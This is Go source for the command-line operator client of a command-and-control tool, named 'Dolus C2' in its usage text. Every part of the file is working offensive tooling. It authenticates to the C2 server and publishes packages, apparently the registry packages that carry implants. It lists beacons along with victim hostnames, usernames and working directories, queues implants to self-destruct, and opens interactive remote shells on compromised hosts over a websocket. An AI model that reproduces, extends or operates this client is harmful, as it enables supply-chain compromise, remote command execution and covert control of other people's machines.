package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"path/filepath"
	"strings"
	"syscall"
	"time"

	"github.com/gorilla/websocket"
	"golang.org/x/term"
)

const configFile = ".dolus.json"

type Config struct {
	Server string `json:"server"`
	Token  string `json:"token"`
}

// ── config ────────────────────────────────────────────────────────────────────

func configPath() string {
	home, _ := os.UserHomeDir()
	return filepath.Join(home, configFile)
}

func loadConfig() (*Config, error) {
	data, err := os.ReadFile(configPath())
	if err != nil {
		return nil, fmt.Errorf("not logged in — run: dolus login <server>")
	}
	var c Config
	if err := json.Unmarshal(data, &c); err != nil {
		return nil, fmt.Errorf("corrupt config — run: dolus login <server>")
	}
	return &c, nil
}

func saveConfig(c *Config) error {
	data, _ := json.MarshalIndent(c, "", "  ")
	return os.WriteFile(configPath(), data, 0600)
}

// ── http ──────────────────────────────────────────────────────────────────────

func doReq(method, url, cookie string, body any) ([]byte, int, error) {
	var r io.Reader
	if body != nil {
		b, _ := json.Marshal(body)
		r = bytes.NewReader(b)
	}
	req, err := http.NewRequest(method, url, r)
	if err != nil {
		return nil, 0, err
	}
	if body != nil {
		req.Header.Set("Content-Type", "application/json")
	}
	if cookie != "" {
		req.Header.Set("Cookie", "dolus_session="+cookie)
	}
	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return nil, 0, err
	}
	defer resp.Body.Close()
	data, _ := io.ReadAll(resp.Body)
	return data, resp.StatusCode, nil
}

func apiJSON(cfg *Config, method, path string, body any, out any) error {
	data, status, err := doReq(method, cfg.Server+path, cfg.Token, body)
	if err != nil {
		return err
	}
	if status >= 400 {
		var e map[string]any
		_ = json.Unmarshal(data, &e)
		if msg, ok := e["error"].(string); ok {
			return fmt.Errorf("server: %s", msg)
		}
		return fmt.Errorf("server returned %d", status)
	}
	if out != nil {
		return json.Unmarshal(data, out)
	}
	return nil
}

// ── formatting ────────────────────────────────────────────────────────────────

func ts(epoch any) string {
	var v int64
	switch x := epoch.(type) {
	case float64:
		v = int64(x)
	case int64:
		v = x
	default:
		return "—"
	}
	if v == 0 {
		return "—"
	}
	return time.Unix(v, 0).Format("2006-01-02 15:04:05")
}

func str(m map[string]any, key string) string {
	if v, ok := m[key]; ok && v != nil {
		return fmt.Sprintf("%v", v)
	}
	return "—"
}

// ── commands ──────────────────────────────────────────────────────────────────

func cmdLogin(args []string) {
	if len(args) == 0 {
		fatal("usage: dolus login <server-url>")
	}
	server := strings.TrimRight(args[0], "/")

	reader := bufio.NewReader(os.Stdin)
	fmt.Print("username: ")
	username, _ := reader.ReadString('\n')
	username = strings.TrimSpace(username)

	fmt.Print("password: ")
	pw, err := term.ReadPassword(int(syscall.Stdin))
	fmt.Println()
	if err != nil {
		fatal("failed to read password: %v", err)
	}

	body := map[string]string{"username": username, "password": string(pw)}
	data, status, err := doReq("POST", server+"/api/auth", "", body)
	if err != nil {
		fatal("connection failed: %v", err)
	}
	if status != 200 {
		var e map[string]any
		_ = json.Unmarshal(data, &e)
		fatal("login failed: %v", e["error"])
	}
	var resp map[string]string
	if err := json.Unmarshal(data, &resp); err != nil || resp["token"] == "" {
		fatal("unexpected response from server")
	}
	if err := saveConfig(&Config{Server: server, Token: resp["token"]}); err != nil {
		fatal("failed to save config: %v", err)
	}
	fmt.Printf("logged in to %s\n", server)
}

func cmdLogout(_ []string) {
	os.Remove(configPath())
	fmt.Println("logged out")
}

func cmdPackages(args []string) {
	cfg := mustConfig()
	if len(args) > 0 {
		switch args[0] {
		case "publish":
			cmdPackagesPublish(cfg, args[1:])
		case "delete", "rm":
			cmdPackagesDelete(cfg, args[1:])
		default:
			fatal("unknown subcommand: packages %s", args[0])
		}
		return
	}

	var rows []map[string]any
	if err := apiJSON(cfg, "GET", "/api/packages", nil, &rows); err != nil {
		fatal("%v", err)
	}
	if len(rows) == 0 {
		fmt.Println("no packages")
		return
	}
	fmt.Printf("%-4s  %-30s  %-10s  %-40s  %s\n", "ID", "NAME", "STATUS", "REGISTRY", "CREATED")
	fmt.Println(strings.Repeat("─", 110))
	for _, r := range rows {
		fmt.Printf("%-4v  %-30s  %-10s  %-40s  %s\n",
			r["id"], str(r, "name"), str(r, "status"), str(r, "registry_url"), ts(r["created_at"]))
	}
}

func cmdPackagesPublish(cfg *Config, args []string) {
	if len(args) == 0 {
		fatal("usage: dolus packages publish <name> [account_id]")
	}
	body := map[string]any{"name": args[0]}
	if len(args) > 1 {
		body["account_id"] = args[1]
	}
	var resp map[string]any
	if err := apiJSON(cfg, "POST", "/api/packages", body, &resp); err != nil {
		fatal("%v", err)
	}
	results, _ := resp["results"].([]any)
	for _, r := range results {
		row := r.(map[string]any)
		fmt.Printf("%-30s  %s\n", str(row, "name"), str(row, "status"))
	}
}

func cmdPackagesDelete(cfg *Config, args []string) {
	if len(args) == 0 {
		fatal("usage: dolus packages delete <id>")
	}
	if err := apiJSON(cfg, "DELETE", "/api/packages/"+args[0], nil, nil); err != nil {
		fatal("%v", err)
	}
	fmt.Println("deleted")
}

func cmdBeacons(args []string) {
	cfg := mustConfig()
	if len(args) > 0 {
		switch args[0] {
		case "show":
			cmdBeaconsShow(cfg, args[1:])
		case "destroy":
			cmdBeaconsDestroy(cfg, args[1:])
		case "shell":
			cmdBeaconsShell(cfg, args[1:])
		default:
			fatal("unknown subcommand: beacons %s", args[0])
		}
		return
	}

	var rows []map[string]any
	if err := apiJSON(cfg, "GET", "/api/beacons", nil, &rows); err != nil {
		fatal("%v", err)
	}
	if len(rows) == 0 {
		fmt.Println("no beacons")
		return
	}
	fmt.Printf("%-4s  %-36s  %-20s  %-12s  %-6s  %s\n", "ID", "BEACON_ID", "HOSTNAME", "PKG", "KILL", "LAST_SEEN")
	fmt.Println(strings.Repeat("─", 110))
	for _, r := range rows {
		kill := "no"
		if k, ok := r["kill"].(float64); ok && k == 1 {
			kill = "QUEUED"
		}
		fmt.Printf("%-4v  %-36s  %-20s  %-12s  %-6s  %s\n",
			r["id"], str(r, "beacon_id"), str(r, "hostname"), str(r, "pkg_name"), kill, ts(r["last_seen"]))
	}
}

func cmdBeaconsShow(cfg *Config, args []string) {
	if len(args) == 0 {
		fatal("usage: dolus beacons show <id>")
	}
	var r map[string]any
	if err := apiJSON(cfg, "GET", "/api/beacons/"+args[0], nil, &r); err != nil {
		fatal("%v", err)
	}
	fields := []struct{ k, label string }{
		{"id", "id"}, {"beacon_id", "beacon_id"}, {"pkg_name", "package"},
		{"hostname", "hostname"}, {"username", "username"}, {"platform", "platform"},
		{"arch", "arch"}, {"os_release", "os_release"}, {"cwd", "cwd"},
		{"last_seen", "last_seen"}, {"created_at", "created"}, {"kill", "kill"},
	}
	for _, f := range fields {
		val := str(r, f.k)
		if f.k == "last_seen" || f.k == "created_at" {
			val = ts(r[f.k])
		}
		fmt.Printf("  %-12s  %s\n", f.label, val)
	}

	if hbs, ok := r["heartbeats"].([]any); ok && len(hbs) > 0 {
		fmt.Printf("\n  heartbeats (%d recent):\n", len(hbs))
		for _, h := range hbs {
			if hm, ok := h.(map[string]any); ok {
				fmt.Printf("    %s\n", ts(hm["ts"]))
			}
		}
	}
}

func cmdBeaconsDestroy(cfg *Config, args []string) {
	if len(args) == 0 {
		fatal("usage: dolus beacons destroy <id>")
	}
	if err := apiJSON(cfg, "PATCH", "/api/beacons/"+args[0], map[string]string{"action": "destroy"}, nil); err != nil {
		fatal("%v", err)
	}
	fmt.Println("destroy queued — beacon will self-destruct on next heartbeat (up to 60s)")
}

func cmdBeaconsShell(cfg *Config, args []string) {
	if len(args) == 0 {
		fatal("usage: dolus beacons shell <id>")
	}
	beaconRowID := args[0]

	// Fetch beacon to get UUID
	var beaconRow map[string]any
	if err := apiJSON(cfg, "GET", "/api/beacons/"+beaconRowID, nil, &beaconRow); err != nil {
		fatal("%v", err)
	}
	beaconUUID, _ := beaconRow["beacon_id"].(string)
	if beaconUUID == "" {
		fatal("beacon not found")
	}

	// Signal the beacon to open a shell
	if err := apiJSON(cfg, "PATCH", "/api/beacons/"+beaconRowID, map[string]string{"action": "shell"}, nil); err != nil {
		fatal("could not request shell: %v", err)
	}

	// Build WS URL: http(s):// → ws(s)://
	serverURL := cfg.Server
	wsBase := strings.Replace(serverURL, "https://", "wss://", 1)
	wsBase = strings.Replace(wsBase, "http://", "ws://", 1)
	wsURL := wsBase + "/ws/shell/" + url.PathEscape(beaconUUID) + "/connect"

	dialer := websocket.Dialer{}
	headers := http.Header{"Cookie": {SESSION_COOKIE + "=" + cfg.Token}}
	conn, _, err := dialer.Dial(wsURL, headers)
	if err != nil {
		fatal("WS connect failed: %v", err)
	}
	defer func() {
		conn.Close()
		_ = apiJSON(cfg, "PATCH", "/api/beacons/"+beaconRowID, map[string]string{"action": "shell_clear"}, nil)
	}()

	// Handle Ctrl+C gracefully
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigCh
		conn.Close()
		os.Exit(0)
	}()

	// Wait for 'connected' — show spinner with "last contact Xs ago"
	var lastSeen int64
	for {
		_, msg, err := conn.ReadMessage()
		if err != nil {
			fatal("connection lost: %v", err)
		}
		var ctrl map[string]any
		if err := json.Unmarshal(msg, &ctrl); err != nil {
			continue
		}
		typ, _ := ctrl["type"].(string)
		if typ == "waiting" {
			if ls, ok := ctrl["last_seen"].(float64); ok {
				lastSeen = int64(ls)
			}
			// Print spinner until implant connects
			doneCh := make(chan struct{})
			go func() {
				ticker := time.NewTicker(time.Second)
				defer ticker.Stop()
				for {
					select {
					case <-doneCh:
						return
					case <-ticker.C:
						ago := int64(time.Since(time.Unix(lastSeen, 0)).Seconds())
						remaining := int64(60) - ago
						fmt.Printf("\r  last contact %ds ago... expecting contact in %ds...  ", ago, remaining)
					}
				}
			}()
			// Block until connected
			for {
				_, msg2, err := conn.ReadMessage()
				if err != nil {
					close(doneCh)
					fmt.Println()
					fatal("connection lost: %v", err)
				}
				var ctrl2 map[string]any
				if json.Unmarshal(msg2, &ctrl2) == nil {
					typ2, _ := ctrl2["type"].(string)
					if typ2 == "connected" {
						close(doneCh)
						fmt.Printf("\r  shell on %s (%s)%s\n",
							ctrl2["hostname"], ctrl2["username"],
							strings.Repeat(" ", 30))
						goto shellLoop
					} else if typ2 == "disconnected" {
						close(doneCh)
						fmt.Println("\n  shell disconnected")
						return
					}
				}
			}
		} else if typ == "connected" {
			fmt.Printf("  shell on %s (%s)\n", ctrl["hostname"], ctrl["username"])
			goto shellLoop
		}
	}

shellLoop:
	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Print("$ ")
		line, err := reader.ReadString('\n')
		if err != nil {
			break
		}
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		if line == "exit" || line == "quit" {
			break
		}
		if err := conn.WriteMessage(websocket.TextMessage, []byte(line)); err != nil {
			fmt.Fprintf(os.Stderr, "send error: %v\n", err)
			break
		}
		// Read response (may be multi-frame for large output)
		conn.SetReadDeadline(time.Now().Add(15 * time.Second))
		_, resp, err := conn.ReadMessage()
		conn.SetReadDeadline(time.Time{})
		if err != nil {
			// Check if it's a disconnect control message
			fmt.Fprintf(os.Stderr, "\nshell disconnected\n")
			break
		}
		// Could be a control message (disconnected) or raw output
		var ctrl map[string]any
		if json.Unmarshal(resp, &ctrl) == nil {
			if t, _ := ctrl["type"].(string); t == "disconnected" {
				fmt.Println("\n  shell disconnected")
				return
			}
		}
		fmt.Print(string(resp))
		if len(resp) > 0 && resp[len(resp)-1] != '\n' {
			fmt.Println()
		}
	}
}

const SESSION_COOKIE = "dolus_session"

// ── helpers ───────────────────────────────────────────────────────────────────

func mustConfig() *Config {
	cfg, err := loadConfig()
	if err != nil {
		fatal("%v", err)
	}
	return cfg
}

func fatal(format string, args ...any) {
	fmt.Fprintf(os.Stderr, "error: "+format+"\n", args...)
	os.Exit(1)
}

func usage() {
	fmt.Print(`dolus — Dolus C2 CLI

Usage:
  dolus login <server>              authenticate (stores token in ~/.dolus.json)
  dolus logout                      clear stored credentials

  dolus packages                    list packages
  dolus packages publish <name>     publish a package (add account_id as 2nd arg)
  dolus packages delete <id>        delete and unpublish a package

  dolus beacons                     list active beacons
  dolus beacons show <id>           show beacon details and heartbeat history
  dolus beacons destroy <id>        queue beacon for self-destruction
  dolus beacons shell <id>          open interactive shell on beacon

`)
}

// ── main ──────────────────────────────────────────────────────────────────────

func main() {
	if len(os.Args) < 2 {
		usage()
		os.Exit(0)
	}
	args := os.Args[2:]
	switch os.Args[1] {
	case "login":
		cmdLogin(args)
	case "logout":
		cmdLogout(args)
	case "packages", "pkg", "p":
		cmdPackages(args)
	case "beacons", "beacon", "b":
		cmdBeacons(args)
	case "help", "--help", "-h":
		usage()
	default:
		fmt.Fprintf(os.Stderr, "unknown command: %s\n", os.Args[1])
		usage()
		os.Exit(1)
	}
}
